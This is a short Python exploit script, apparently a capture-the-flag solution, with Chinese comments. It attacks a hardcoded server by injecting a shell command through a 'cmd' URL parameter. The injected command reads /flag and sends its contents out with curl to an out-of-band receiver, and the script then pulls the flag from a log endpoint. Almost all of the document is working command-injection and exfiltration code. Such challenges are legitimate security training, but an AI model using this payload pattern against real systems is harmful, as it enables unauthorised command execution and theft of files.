#!/usr/bin/env python3
import re
import time
import urllib.parse
import requests

BASE = "http://47.120.61.230:33446"


def trigger():
    """
    触发 blind command injection。
    页面不会回显命令输出，所以通过题目内置 OOB 接收器外带 flag。
    """
    cmd = "sh -c 'f=$(cat /flag); curl -sG --data-urlencode \"c=$f\" http://127.0.0.1/oob'"
    url = BASE + "/?" + urllib.parse.urlencode({"cmd": cmd})

    print("[+] Trigger command injection")
    print("[+] URL:", url)
    print("[+] CMD:", cmd)

    r = requests.get(url, timeout=10)
    print("[+] Trigger status:", r.status_code)
    print("[+] Trigger response:")
    print(r.text[:500])


def read_oob_log():
    """读取 OOB 日志。"""
    print("[+] Reading /oob-log")
    r = requests.get(BASE + "/oob-log", timeout=10)
    print("[+] Log status:", r.status_code)
    return r.text


def main():
    trigger()
    time.sleep(1)

    log = read_oob_log()

    print()
    print("========== OOB LOG ==========")
    print(log)
    print("=============================")
    print()

    m = re.search(r"TOGOGO-flag\{[^}]+\}", log)

    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[-] Flag not found.")
        print("[-] Maybe retry after a few seconds:")
        print("    python3 main.py")


if __name__ == "__main__":
    main()
